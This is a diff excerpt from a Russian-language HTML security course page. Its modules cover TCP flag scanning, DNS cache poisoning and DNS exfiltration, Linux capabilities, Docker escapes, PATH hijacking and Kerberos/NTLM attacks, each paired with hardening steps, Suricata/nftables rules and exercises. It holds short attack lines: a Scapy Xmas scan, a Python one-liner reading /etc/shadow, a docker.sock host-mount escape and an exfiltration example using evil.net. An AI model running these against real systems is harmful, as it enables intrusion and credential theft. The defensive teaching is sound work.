+              <pre class="code-panel active" data-panel="vuln"><code># Генерация аномальных TCP-флагов для обхода фаерволов через Scapy
+from scapy.all import IP, TCP, sr1
+
+# Отправка пакета Xmas (FIN+PSH+URG)
+xmas_packet = IP(dst="192.168.1.10")/TCP(dport=80, flags="FPU")
+response = sr1(xmas_packet, timeout=2)
+
+if response is None:
+    print("Порт открыт или фильтруется (RFC 793 compliant)")
+elif response.haslayer(TCP) and response[TCP].flags == "RA":
+    print("Порт закрыт (получен RST/ACK)")</code></pre>
+
+              <pre class="code-panel" data-panel="patch"><code># Защита на уровне ядра Linux (nftables / sysctl Hardening)
+
+# 1. Сброс аномальных пакетов с флагами сканеров
+table inet filter {
+    chain input {
+        type filter hook input priority 0; policy accept;
+        
+        # Блокировка NULL scan (нет флагов)
+        tcp flags & (fin|syn|rst|psh|ack|urg) == 0 drop
+        
+        # Блокировка Xmas scan (FIN, PSH, URG)
+        tcp flags & (fin|syn|rst|psh|ack|urg) == fin|psh|urg drop
+        
+        # Блокировка SYN-FIN пакетов
+        tcp flags & (fin|syn) == fin|syn drop
+    }
+}
+
+# 2. Включение защиты от SYN-flood на уровне сетевого стека ядра
+sysctl -w net.ipv4.tcp_syncookies=1
+sysctl -w net.ipv4.tcp_max_syn_backlog=2048</code></pre>
+
+              <pre class="code-panel" data-panel="defense"><code># Сигнатура Suricata для выявления Xmas сканирования
+alert tcp any any -> $HOME_NET any (msg:"SCAN Xmas Stealth Portscan"; flags:FPU; classtype:attempted-recon; sid:2000020; rev:1;)
+
+# Сигнатура Suricata для выявления быстрого SYN-сканирования (threshold)
+alert tcp any any -> $HOME_NET any (msg:"SCAN Rapid SYN Portscan Threshold Exceeded"; flags:S,12; threshold:type both, track by_src, count 25, seconds 3; classtype:attempted-recon; sid:2000021; rev:1;)</code></pre>
+            </div>
+
+            <!-- Tasks -->
+            <div class="tasks-container">
+              <div class="task-card">
+                <div class="task-top">
+                  <label class="task-label">
+                    <input type="checkbox" class="task-checkbox" data-task-id="scan-1">
+                    <div class="task-text">
+                      <div class="task-title">Задание 2.2: Разработка правила nftables для сброса аномальных TCP-флагов</div>
+                      <div class="task-desc">Сконфигурировать фильтрацию пакетов NULL-сканирования (flags == 0) и Xmas-сканирования в Linux.</div>
+                    </div>
+                  </label>
+                </div>
+                <div class="task-details">
+                  Сформируйте правило <code>iptables</code> или <code>nftables</code>, проверяющее маску <code>tcp flags & (fin|syn|rst|psh|ack|urg)</code>.
+                  <button class="hint-toggle"><span>💡 Показать решение / подсказку</span></button>
+                  <div class="hint-content">
+                    <code>iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP
+iptables -A INPUT -p tcp --tcp-flags ALL FIN,PSH,URG -j DROP</code>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </article>
+
+        <!-- 2.3 DNS Security -->
+        <article class="topic-card" id="topic-dns" data-roles="red blue detection">
+          <div class="topic-header">
+            <div class="topic-title-group">
+              <h3>2.3 DNS Безопасность: Атака Дэна Камински (Kaminsky Bug), энтропия Шеннона и DNS Tunneling</h3>
+              <div class="topic-meta">
+                <span class="badge badge-mitre">MITRE T1071.004</span>
+                <span class="badge badge-cve">CVE-2008-1447</span>
+                <span class="badge badge-level-hard">СЕТЕВАЯ КРИПТОГРАФИЯ</span>
+              </div>
+            </div>
+          </div>
+
+          <div class="topic-body">
+            <div class="theory-block">
+              <div class="theory-text">
+                <div class="theory-subheading">Архитектура DNS и уязвимость кэширующих резолверов (Dan Kaminsky Attack)</div>
+                <p>
+                  Протокол DNS (<span class="rfc-badge">RFC 1035</span>) работает поверх ненадежного протокола UDP (порт 53). 
+                  В оригинальном стандарте для подтверждения того, что ответ пришел от легитимного авторитетного сервера, использовалось единственное 16-битное поле — <strong>Transaction ID (TxID)</strong>. 
+                  Общее пространство возможных значений составляло всего $2^{16} = 65536$ вариантов.
+                </p>
+                <p>
+                  В 2008 году Дэн Камински показал, как обойти защиту кэширования: атакующий запрашивает у резолвера несуществующий случайный субдомен (<code>random1.bank.com</code>, <code>random2.bank.com</code>). 
+                  Резолвер отправляет запрос к авторитетному серверу, а атакующий одновременно посылает лавину поддельных UDP-ответов со всеми 65536 возможными TxID, вкладывая в секцию <em>Authority</em> поддельную NS-запись: <em>«Авторитетным сервером для всей зоны bank.com является ns.attacker.com»</em>. 
+                  Как только один из 65536 ответов угадывает TxID, резолвер отравляет кэш для <strong>всего домена целиком</strong>!
+                </p>
+                <p>
+                  <strong>Современный стандарт защиты (Source Port Randomization):</strong> Резолверы обязаны рандомизировать не только 16-битный TxID, но и 16-битный исходный UDP-порт клиента. Энтропия поиска возрастает до $2^{16} \times 2^{16} = 2^{32} \approx 4.29 \times 10^9$ комбинаций, что делает перебор по сети физически невозможным.
+                </p>
+
+                <div class="theory-subheading">Механика скрытого туннелирования данных через DNS (DNS Exfiltration)</div>
+                <p>
+                  Поскольку DNS необходим для работы сети, UDP-порт 53 практически всегда открыт на исходящий трафик даже в самых изолированных корпоративных сегментах. Вредоносное ПО кодирует конфиденциальные данные (хэши, документы) в Base32/Base64 и запрашивает доменные имена:
+                </p>
+                <div class="math-block">
+                  Схема запроса: [Base32(Секретные данные)].c2.attacker-controlled-domain.com<br>
+                  Пример: JBSWY3DPEBLW64TMMQ.exfil.evil.net
+                </div>
+                <p>
+                  Локальный корпоративный резолвер не знает ответа и пересылает запрос по цепочке к авторитетному серверу <code>evil.net</code>, принадлежащему атакующему. Атакующий декодирует строку из логов DNS-демона, не устанавливая прямого TCP-соединения с жертвой!
+                </p>
+
+                <div class="theory-subheading">Математика обнаружения через энтропию Шеннона</div>
+                <p>
+                  Легитимные доменные имена (например, <code>mail.google.com</code>, <code>api.github.com</code>) обладают низким уровнем хаотичности символов. Закодированные данные (Base64/Hex) имеют высокую статистическую энтропию по формуле Шеннона:
+                </p>
+                <div class="math-block">
+                  H(X) = - ∑ P(xᵢ) × log₂(P(xᵢ))<br>
+                  Легитимный трафик: H(X) обычно находится в диапазоне 2.2 – 3.2 бит/символ.<br>
+                  Туннелирование / Эксфильтрация: H(X) превышает 3.8 – 4.5 бит/символ + длина метки поддомена > 30 символов.
+                </div>
+              </div>
+            </div>
+
+            <!-- Tasks -->
+            <div class="tasks-container">
+              <div class="task-card">
+                <div class="task-top">
+                  <label class="task-label">
+                    <input type="checkbox" class="task-checkbox" data-task-id="dns-1">
+                    <div class="task-text">
+                      <div class="task-title">Задание 2.3: Сигнатурное детектирование DNS Tunneling в Suricata</div>
+                      <div class="task-desc">Написать правило для Suricata, отслеживающее запросы с аномальной длиной метки поддомена (> 45 символов).</div>
+                    </div>
+                  </label>
+                </div>
+                <div class="task-details">
+                  Используйте ключевые слова <code>dns.query</code> и операторы регулярных выражений pcre.
+                  <button class="hint-toggle"><span>💡 Показать решение / подсказку</span></button>
+                  <div class="hint-content">
+                    <code>alert dns any any -> $HOME_NET 53 (msg:"SUSPICIOUS Long DNS Subdomain Exfiltration Query"; dns.query; pcre:"/^[a-zA-Z0-9_-]{45,}\./"; classtype:bad-unknown; sid:2000030; rev:1;)</code>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </article>
+      </section>
+
+      <!-- =====================================================================
+           МОДУЛЬ 3: БЕЗОПАСНОСТЬ ОПЕРАЦИОННЫХ СИСТЕМ И ХОСТОВ (LINUX)
+           ===================================================================== -->
+      <section class="module-section">
+        <div class="module-header">
+          <div class="module-title-wrap">
+            <div class="module-num">03</div>
+            <div>
+              <h2 class="module-title">Безопасность ОС и хостов (Linux Deep Dive)</h2>
+              <div class="module-desc">Внутренности ядра Linux, структура task_struct, Linux Capabilities, изоляция контейнеров и glibc AT_SECURE</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- 3.1 Linux Capabilities -->
+        <article class="topic-card" id="topic-caps" data-roles="red blue">
+          <div class="topic-header">
+            <div class="topic-title-group">
+              <h3>3.1 Linux Capabilities: Структура struct cred ядра, деконструкция root и Privilege Escalation</h3>
+              <div class="topic-meta">
+                <span class="badge badge-mitre">MITRE T1068</span>
+                <span class="badge badge-cve">Kernel Security</span>
+                <span class="badge badge-level-mid">LINUX INTERNALS</span>
+              </div>
+            </div>
+          </div>
+
+          <div class="topic-body">
+            <div class="theory-block">
+              <div class="theory-text">
+                <div class="theory-subheading">Внутренняя реализация прав в ядре Linux</div>
+                <p>
+                  В исходном коде ядра Linux каждому запущенному процессу соответствует структура <code>struct task_struct</code>, которая хранит указатель на структуру учетных данных <strong><code>struct cred</code></strong> (файл <code>include/linux/cred.h</code>):
+                </p>
+                <div class="math-block">
+                  struct cred {<br>
+                  &nbsp;&nbsp;kuid_t uid, euid, suid, fsuid;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/* Идентификаторы пользователя */<br>
+                  &nbsp;&nbsp;kernel_cap_t cap_inheritable;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/* Набор наследуемых возможностей */<br>
+                  &nbsp;&nbsp;kernel_cap_t cap_permitted;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/* Максимальный набор разрешенных прав */<br>
+                  &nbsp;&nbsp;kernel_cap_t cap_effective;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/* Активные права в текущий такт времени */<br>
+                  &nbsp;&nbsp;kernel_cap_t cap_bset;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/* Bounding set (верхняя граница прав) */<br>
+                  &nbsp;&nbsp;kernel_cap_t cap_ambient;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/* Права, сохраняемые при execve() */<br>
+                  };
+                </div>
+
+                <div class="theory-subheading">Матрица критических Capabilities и векторов эскалации привилегий</div>
+                <div class="table-responsive">
+                  <table class="theory-table">
+                    <thead>
+                      <tr>
+                        <th>Флаг Capability</th>
+                        <th>Штатное назначение</th>
+                        <th>Вектор нелегитимной эксплуатации (Root Exploit)</th>
+                        <th>Критичность</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                      <tr>
+                        <td><strong>CAP_DAC_READ_SEARCH</strong></td>
+                        <td>Разрешает демонам резервного копирования читать файлы без прав доступа.</td>
+                        <td>Прямое чтение файла <code>/etc/shadow</code> или закрытых SSH-ключей суперпользователя <code>/root/.ssh/id_rsa</code>.</td>
+                        <td><span style="color: var(--accent-crimson); font-weight: bold;">Critical</span></td>
+                      </tr>
+                      <tr>
+                        <td><strong>CAP_DAC_OVERRIDE</strong></td>
+                        <td>Разрешает обход прав доступа на запись и модификацию любых файлов.</td>
+                        <td>Прямая перезапись <code>/etc/passwd</code> (добавление root-пользователя с пустым паролем) или перезапись <code>/etc/sudoers</code>.</td>
+                        <td><span style="color: var(--accent-crimson); font-weight: bold;">Critical</span></td>
+                      </tr>
+                      <tr>
+                        <td><strong>CAP_SYS_PTRACE</strong></td>
+                        <td>Отладка процессов (gdb, strace).</td>
+                        <td>Внедрение шеллкода в память любого root-процесса в системе через системные вызовы <code>ptrace(PTRACE_POKETEXT)</code>.</td>
+                        <td><span style="color: var(--accent-crimson); font-weight: bold;">Critical</span></td>
+                      </tr>
+                      <tr>
+                        <td><strong>CAP_SYS_ADMIN</strong></td>
+                        <td>«Новый root»: монтирование файловых систем, управление namespaces, BPF.</td>
+                        <td>Монтирование дисков, побег из cgroups, замена системных структур ядра, перехват системных вызовов.</td>
+                        <td><span style="color: var(--accent-crimson); font-weight: bold;">Critical</span></td>
+                      </tr>
+                      <tr>
+                        <td><strong>CAP_SETUID</strong></td>
+                        <td>Разрешает произвольное изменение UID процесса.</td>
+                        <td>Вызов <code>setuid(0)</code> из кода интерпретатора (Python/C) мгновенно делает процесс полноценным root.</td>
+                        <td><span style="color: var(--accent-crimson); font-weight: bold;">Critical</span></td>
+                      </tr>
+                      <tr>
+                        <td><strong>CAP_NET_RAW</strong></td>
+                        <td>Создание RAW-сокетов (ping).</td>
+                        <td>Генерация произвольных пакетов, ARP Spoofing и прослушивание локального сетевого интерфейса в режиме Promiscuous.</td>
+                        <td><span style="color: var(--accent-amber); font-weight: bold;">High</span></td>
+                      </tr>
+                    </tbody>
+                  </table>
+                </div>
+
+                <div class="theory-subheading">Защитный механизм PR_SET_NO_NEW_PRIVS</div>
+                <p>
+                  Системный вызов <code>prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)</code> указывает ядру Linux, что данный процесс и все его дочерние потомки <strong>ни при каких условиях не могут повысить привилегии</strong> (даже если они запускают исполняемый файл с битом SUID или расширенными Capabilities). Этот механизм является фундаментальной базой безопасности Docker и systemd.
+                </p>
+              </div>
+            </div>
+
+            <!-- Code Viewer -->
+            <div class="code-viewer">
+              <div class="code-tabs">
+                <div class="tab-buttons">
+                  <button class="code-tab-btn tab-vuln active" data-tab="vuln">🔴 Аудит & Поиск уязвимостей</button>
+                  <button class="code-tab-btn tab-patch" data-tab="patch">🔵 Systemd Hardening (Безопасный сервис)</button>
+                </div>
+                <button class="copy-btn"><span>📋 Копировать</span></button>
+              </div>
+
+              <pre class="code-panel active" data-panel="vuln"><code># Поиск файлов с расширенными возможностями (Capabilities):
+getcap -r / 2>/dev/null
+
+# Пример опасной конфигурации администратора:
+# /usr/bin/python3 = cap_dac_read_search+ep
+
+# Мгновенная эксплуатация (чтение /etc/shadow непривилегированным пользователем):
+python3 -c 'print(open("/etc/shadow").read())'</code></pre>
+
+              <pre class="code-panel" data-panel="patch"><code># Правильная конфигурация службы в Systemd (Принцип наименьших привилегий)
+[Unit]
+Description=Secure Microservice API
+After=network.target
+
+[Service]
+Type=simple
+User=svc_app
+Group=svc_app
+ExecStart=/usr/bin/python3 /opt/app/server.py
+
+# Харденинг на уровне Systemd:
+CapabilityBoundingSet=CAP_NET_BIND_SERVICE
+AmbientCapabilities=CAP_NET_BIND_SERVICE
+NoNewPrivileges=true
+ProtectSystem=strict
+ProtectHome=true
+PrivateTmp=true</code></pre>
+            </div>
+
+            <!-- Tasks -->
+            <div class="tasks-container">
+              <div class="task-card">
+                <div class="task-top">
+                  <label class="task-label">
+                    <input type="checkbox" class="task-checkbox" data-task-id="caps-1">
+                    <div class="task-text">
+                      <div class="task-title">Задание 3.1: Инвентаризация Capabilities и отзыв опасных флагов</div>
+                      <div class="task-desc">Выполнить аудит системы утилитой <code>getcap</code> и корректно удалить флаг <code>cap_dac_read_search</code>.</div>
+                    </div>
+                  </label>
+                </div>
+                <div class="task-details">
+                  Используйте утилиту <code>setcap -r /path/to/binary</code>.
+                  <button class="hint-toggle"><span>💡 Показать решение / подсказку</span></button>
+                  <div class="hint-content">
+                    <code>sudo setcap -r /usr/bin/python3.11</code>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </article>
+
+        <!-- 3.2 Docker Escapes -->
+        <article class="topic-card" id="topic-docker" data-roles="red blue">
+          <div class="topic-header">
+            <div class="topic-title-group">
+              <h3>3.2 Побег из контейнеров Docker: Механизмы Namespaces, Cgroups, Privileged Flags и Docker Socket</h3>
+              <div class="topic-meta">
+                <span class="badge badge-mitre">MITRE T1611</span>
+                <span class="badge badge-cve">Container Breakout</span>
+                <span class="badge badge-level-hard">CLOUD INFRASTRUCTURE</span>
+              </div>
+            </div>
+          </div>
+
+          <div class="topic-body">
+            <div class="theory-block">
+              <div class="theory-text">
+                <div class="theory-subheading">Контейнеризация против Аппаратной виртуализации</div>
+                <p>
+                  Виртуальная машина (KVM, VMware, Hyper-V) запускает собственное независимое ядро поверх виртуального оборудования с аппаратной изоляцией (Intel VT-x, AMD-V, SLAT). 
+                  Контейнер Docker делит <strong>одно общее монолитное ядро с хостовой операционной системой</strong>. Изоляция базируется на трех технологиях ядра Linux:
+                </p>
+                <div class="table-responsive">
+                  <table class="theory-table">
+                    <thead>
+                      <tr>
+                        <th>Технология изоляции ядра</th>
+                        <th>Назначение</th>
+                        <th>Объекты разграничения</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                      <tr>
+                        <td><strong>Namespaces (Пространства имен)</strong></td>
+                        <td>Ограничивает область видимости системных ресурсов для процесса.</td>
+                        <td>PID (процессы), NET (сетевые интерфейсы), MNT (точки монтирования ФС), IPC (память), UTS (имя хоста), USER (UID/GID mapping).</td>
+                      </tr>
+                      <tr>
+                        <td><strong>Control Groups (Cgroups)</strong></td>
+                        <td>Ограничивает потребление ресурсов процессом.</td>
+                        <td>Лимиты CPU, оперативной памяти (RAM/Swap), дискового ввода-вывода (I/O) и числа процессов (pids.max).</td>
+                      </tr>
+                      <tr>
+                        <td><strong>LSM (Linux Security Modules)</strong></td>
+                        <td>Мандатный контроль доступа поверх стандартных прав.</td>
+                        <td>Профили <strong>AppArmor</strong>, политики <strong>SELinux</strong> и фильтрация системных вызовов <strong>Seccomp</strong> (блокирует опасные syscalls: <code>clone</code>, <code>mount</code>, <code>ptrace</code>).</td>
+                      </tr>
+                    </tbody>
+                  </table>
+                </div>
+
+                <div class="theory-subheading">Вектор 1: Монтирование /var/run/docker.sock внутрь контейнера</div>
+                <p>
+                  Сокет <code>docker.sock</code> — это прямой канал управления демоном <code>dockerd</code> через протокол REST API (IPC сокет). 
+                  Если непривилегированный контейнер имеет доступ к этому файлу сокета, атакующий отправляет команду демону хоста на запуск привилегированного контейнера-сателлита с монтированием всей файловой системы хоста:
+                </p>
+                <div class="math-block">
+                  docker run -v /:/host_root -it ubuntu chroot /host_root<br>
+                  Результат: Мгновенный выход в физический root хостовой машины!
+                </div>
+
+                <div class="theory-subheading">Вектор 2: Флаг --privileged и побег через cgroups release_agent</div>
+                <p>
+                  Флаг <code>--privileged</code> отключает все барьеры изоляции:
+                </p>
+                <ul style="padding-left: 20px; margin-bottom: 8px;">
+                  <li>Отключает Seccomp фильтрацию и AppArmor профиль.</li>
+                  <li>Выдает процессу все возможные <code>CAP_*</code> (включая <code>CAP_SYS_ADMIN</code>).</li>
+                  <li>Монтирует все системные устройства хоста в каталог <code>/dev</code> контейнера.</li>
+                </ul>
+                <p>
+                  При наличии <code>CAP_SYS_ADMIN</code> атакующий внутри контейнера монтирует cgroup v1 контроллер, записывает команду шелла в файл хоста и регистрирует путь к нему в параметре <code>release_agent</code> ядра. При завершении дочернего процесса ядро хоста исполняет скрипт атакующего от имени <strong>root хостовой системы</strong>!
+                </p>
+              </div>
+            </div>
+
+            <!-- Tasks -->
+            <div class="tasks-container">
+              <div class="task-card">
+                <div class="task-top">
+                  <label class="task-label">
+                    <input type="checkbox" class="task-checkbox" data-task-id="docker-1">
+                    <div class="task-text">
+                      <div class="task-title">Задание 3.2: Безопасный запуск контейнеров (Rootless Docker & Security Opts)</div>
+                      <div class="task-desc">Сконфигурировать параметры <code>docker-compose.yml</code> для запрета повышения привилегий (<code>no-new-privileges:true</code>) и изоляции сокетов.</div>
+                    </div>
+                  </label>
+                </div>
+                <div class="task-details">
+                  Добавьте секцию <code>security_opt: [ "no-new-privileges:true" ]</code> и используйте <code>read_only: true</code> для корневой файловой системы контейнера.
+                  <button class="hint-toggle"><span>💡 Показать решение / подсказку</span></button>
+                  <div class="hint-content">
+                    <code>services:
+  app:
+    security_opt:
+      - no-new-privileges:true
+    read_only: true
+    tmpfs:
+      - /tmp</code>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </article>
+
+        <!-- 3.3 SUID & PATH Hijacking -->
+        <article class="topic-card" id="topic-suid" data-roles="red blue">
+          <div class="topic-header">
+            <div class="topic-title-group">
+              <h3>3.3 SUID/SGID, поведение динамического линковщика glibc (AT_SECURE) и PATH Hijacking</h3>
+              <div class="topic-meta">
+                <span class="badge badge-mitre">MITRE T1548.001</span>
+                <span class="badge badge-level-mid">СИСТЕМНОЕ ПО</span>
+              </div>
+            </div>
+          </div>
+
+          <div class="topic-body">
+            <div class="theory-block">
+              <div class="theory-text">
+                <div class="theory-subheading">Семантика идентификаторов пользователя: RUID, EUID, SUID</div>
+                <p>
+                  Каждый процесс в Unix имеет 3 ключевых идентификатора пользователя:
+                </p>
+                <ul style="padding-left: 20px; margin-bottom: 8px;">
+                  <li><strong>RUID (Real UID):</strong> Реальный идентификатор пользователя, запустившего процесс.</li>
+                  <li><strong>EUID (Effective UID):</strong> Идентификатор, на основе которого ядро проверяет права доступа к файлам и системным вызовам в данный момент.</li>
+                  <li><strong>SUID (Saved UID):</strong> Сохраненный идентификатор, позволяющий процессам переключаться между непривилегированным и привилегированным состоянием.</li>
+                </ul>
+                <p>
+                  Когда на исполняемом файле установлен специальный бит разрешения <strong>SUID (chmod u+s /path/binary)</strong>, ядро при выполнении системного вызова <code>execve()</code> устанавливает <code>EUID = владельцу файла</code> (обычно root), независимо от того, кто запустил бинарник.
+                </p>
+
+                <div class="theory-subheading">Безопасность glibc: Механизм AT_SECURE и переменные окружения</div>
+                <p>
+                  Почему нельзя просто подменить библиотеку через <code>LD_PRELOAD=/tmp/evil.so</code> для бинарника <code>/usr/bin/passwd</code>?
+                  Динамический линковщик <code>ld.so</code> при загрузке ELF-файла проверяет флаг ядра <strong><code>AT_SECURE</code></strong> (auxiliary vector). 
+                  Если <code>RUID != EUID</code>, линковщик принудительно <strong>игнорирует все опасные переменные окружения</strong>: <code>LD_PRELOAD</code>, <code>LD_LIBRARY_PATH</code>, <code>LD_AUDIT</code>!
+                </p>
+
+                <div class="theory-subheading">Механика уязвимости PATH Hijacking</div>
+                <p>
+                  Уязвимость возникает, когда программист в привилегированном C/C++ приложении вызывает системные команды без указания абсолютного пути:
+                </p>
+                <div class="math-block">
+                  system("curl -s http://internal.local/status"); // ОШИБКА!<br>
+                  // system() вызывает shell: /bin/sh -c "curl ..."<br>
+                  // Оболочка ищет утилиту curl слева направо по переменной $PATH!
+                </div>
+                <p>
+                  Атакующий добавляет подконтрольный каталог в начало переменной PATH: <code>export PATH=/tmp/evil:$PATH</code>, создает исполняемый файл <code>/tmp/evil/curl</code> со своим шеллкодом. При запуске SUID-программы утилита <code>curl</code> запускается с правами root!
+                </p>
+              </div>
+            </div>
+
+            <!-- Tasks -->
+            <div class="tasks-container">
+              <div class="task-card">
+                <div class="task-top">
+                  <label class="task-label">
+                    <input type="checkbox" class="task-checkbox" data-task-id="suid-1">
+                    <div class="task-text">
+                      <div class="task-title">Задание 3.3: Поиск SUID-файлов и устранение уязвимостей PATH</div>
+                      <div class="task-desc">Найти все SUID бинарники в системе командой <code>find</code> и переписать небезопасный вызов <code>system()</code> на безопасный <code>execv()</code>.</div>
+                    </div>
+                  </label>
+                </div>
+                <div class="task-details">
+                  Команда аудита: <code>find / -perm -4000 -type f 2>/dev/null</code>.
+                  <button class="hint-toggle"><span>💡 Показать решение / подсказку</span></button>
+                  <div class="hint-content">
+                    <code>char *args[] = {"/usr/bin/curl", "-s", "http://internal.local/status", NULL};
+execv(args[0], args);</code>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </article>
+      </section>
+
+      <!-- =====================================================================
+           МОДУЛЬ 4: КОРПОРАТИВНАЯ БЕЗОПАСНОСТЬ И ACTIVE DIRECTORY
+           ===================================================================== -->
+      <section class="module-section">
+        <div class="module-header">
+          <div class="module-title-wrap">
+            <div class="module-num">04</div>
+            <div>
+              <h2 class="module-title">Корпоративная безопасность и Active Directory</h2>
+              <div class="module-desc">Спецификация Kerberos RFC 4120, структуры TGT/TGS/PAC, атака Pass-the-Hash и уязвимости сертификатов AD CS (ESC1)</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- 4.1 Kerberos -->
+        <article class="topic-card" id="topic-kerberos" data-roles="red blue detection">
+          <div class="topic-header">
+            <div class="topic-title-group">
+              <h3>4.1 Протокол Kerberos V5 (RFC 4120): Архитектура билетов, структура PAC, Kerberoasting и AS-REP Roasting</h3>
+              <div class="topic-meta">
+                <span class="badge badge-mitre">MITRE T1558.003</span>
+                <span class="badge badge-level-mid">ENTERPRISE AD</span>
+              </div>
+            </div>
+          </div>
+
+          <div class="topic-body">
+            <div class="theory-block">
+              <div class="theory-text">
+                <div class="theory-subheading">Трехфазная архитектура аутентификации Kerberos (RFC 4120)</div>
+                <p>
+                  Протокол Kerberos решает проблему безопасной взаимной аутентификации в недоверенной сети через доверенный центр распределения ключей (<strong>KDC — Key Distribution Center</strong>), функционирующий на контроллере домена (порт 88 TCP/UDP):
+                </p>
+                <div class="protocol-steps">
+                  <div class="protocol-step">
+                    <div class="step-num">1</div>
+                    <div>
+                      <strong>Authentication Service Exchange (AS-REQ / AS-REP):</strong> Клиент шифрует текущую временную метку (Timestamp) хэшем своего пароля (Pre-Authentication). KDC расшифровывает метку и возвращает <strong>TGT (Ticket Granting Ticket)</strong>, зашифрованный секретным мастер-ключом служебного аккаунта <code>krbtgt</code>.
+                    </div>
+                  </div>
+                  <div class="protocol-step">
+                    <div class="step-num">2</div>
+                    <div>
+                      <strong>Ticket Granting Service Exchange (TGS-REQ / TGS-REP):</strong> Клиент предъявляет KDC свой TGT и запрашивает сервисный билет к конкретной службе с именем <strong>SPN (Service Principal Name)</strong>, например <code>MSSQLSvc/db01.corp.local:1433</code>. KDC возвращает <strong>TGS-билет</strong>, зашифрованный хэшем пароля сервисной учетной записи!
+                    </div>
+                  </div>
+                  <div class="protocol-step">
+                    <div class="step-num">3</div>
+                    <div>
+                      <strong>Client / Server Exchange (AP-REQ / AP-REP):</strong> Клиент передает TGS целевому серверу. Сервер расшифровывает билет своим паролем и проверяет права доступа.
+                    </div>
+                  </div>
+                </div>
+
+                <div class="theory-subheading">Структура Privilege Attribute Certificate (PAC)</div>
+                <p>
+                  В реализации Microsoft Kerberos билет содержит критическую структуру <strong>PAC</strong>. Она включает полный список идентификаторов безопасности (SID) доменных групп, в которых состоит пользователь (включая Domain Admins), а также две криптографические контрольные подписи:
+                </p>
+                <ul style="padding-left: 20px; margin-bottom: 8px;">
+                  <li><strong>Server Signature:</strong> Подписана хэшем пароля целевого сервиса.</li>
+                  <li><strong>KDC Signature:</strong> Подписана хэшем мастер-ключа <code>krbtgt</code> (защищает от нелегитимного повышения прав и подделки групп).</li>
+                </ul>
+
+                <div class="theory-subheading">Сравнительный анализ Kerberoasting и AS-REP Roasting</div>
+                <div class="table-responsive">
+                  <table class="theory-table">
+                    <thead>
+                      <tr>
+                        <th>Характеристика</th>
+                        <th>Kerberoasting (TGS Attack)</th>
+                        <th>AS-REP Roasting (AS Attack)</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                      <tr>
+                        <td><strong>Необходимые привилегии</strong></td>
+                        <td>Любой аутентифицированный пользователь домена.</td>
+                        <td><strong>Вообще без учетной записи</strong> (нужно только знать имя логина).</td>
+                      </tr>
+                      <tr>
+                        <td><strong>Уязвимое условие</strong></td>
+                        <td>Наличие у сервисной учетной записи зарегистрированного SPN.</td>
+                        <td>Выставленный флаг учетной записи: <code>DONT_REQ_PREAUTH</code> (Pre-authentication не требуется).</td>
+                      </tr>
+                      <tr>
+                        <td><strong>Тип перехватываемого тикета</strong></td>
+                        <td>TGS-билет (шифрован паролем сервисного аккаунта).</td>
+                        <td>AS-REP ответ (зашифрован паролем целевого пользователя).</td>
+                      </tr>
+                      <tr>
+                        <td><strong>Режим перебора в Hashcat</strong></td>
+                        <td><code>hashcat -m 13100</code> (Kerberos 5 TGS-REP etype 23).</td>
+                        <td><code>hashcat -m 18200</code> (Kerberos 5 AS-REP etype 23).</td>
+                      </tr>
+                      <tr>
+                        <td><strong>Архитектурная защита</strong></td>
+                        <td>Переход на <strong>gMSA</strong> (Group Managed Service Accounts с 128-значными паролями) + отказ от RC4-HMAC.</td>
+                        <td>Включение обязательной предварительной аутентификации Kerberos для всех учетных записей.</td>
+                      </tr>
+                    </tbody>
+                  </table>
+                </div>
+              </div>
+            </div>
+
+            <!-- Tasks -->
+            <div class="tasks-container">
+              <div class="task-card">
+                <div class="task-top">
+                  <label class="task-label">
+                    <input type="checkbox" class="task-checkbox" data-task-id="kerb-1">
+                    <div class="task-text">
+                      <div class="task-title">Задание 4.1: Мониторинг Kerberoasting по событиям Windows Event ID 4769</div>
+                      <div class="task-desc">Написать запрос для SIEM для выявления аномального запроса TGS-тикетов со слабым шифрованием RC4 (0x17).</div>
+                    </div>
+                  </label>
+                </div>
+                <div class="task-details">
+                  Отследите поле Ticket Encryption Type: <code>0x17</code> (RC4-HMAC) при обращении к непривилегированным SPN.
+                  <button class="hint-toggle"><span>💡 Показать решение / подсказку</span></button>
+                  <div class="hint-content">
+                    <code>EventID: 4769 AND TicketOptions: 0x40810000 AND TicketEncryptionType: 0x17 AND ServiceName != "*$"</code>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </article>
+
+        <!-- 4.2 Pass-the-Hash -->
+        <article class="topic-card" id="topic-pth" data-roles="red blue">
+          <div class="topic-header">
+            <div class="topic-title-group">
+              <h3>4.2 Pass-the-Hash (PtH), протокол NTLM Challenge-Response и атаки NTLM Relay</h3>
+              <div class="topic-meta">
+                <span class="badge badge-mitre">MITRE T1550.002</span>
+                <span class="badge badge-level-mid">WINDOWS AUTH</span>
+              </div>
+            </div>
+          </div>
+
+          <div class="topic-body">
+            <div class="theory-block">
+              <div class="theory-text">
+                <div class="theory-subheading">Математика протокола NTLM Challenge-Response</div>
+                <p>
+                  Протокол NTLMv2 основан на трехфазном рукопожатии:
+                </p>
+                <div class="protocol-steps">
+                  <div class="protocol-step">
+                    <div class="step-num">1</div>
+                    <div><strong>Type 1 (Negotiate):</strong> Клиент объявляет серверу список поддерживаемых криптографических возможностей.</div>
+                  </div>
+                  <div class="protocol-step">
+                    <div class="step-num">2</div>
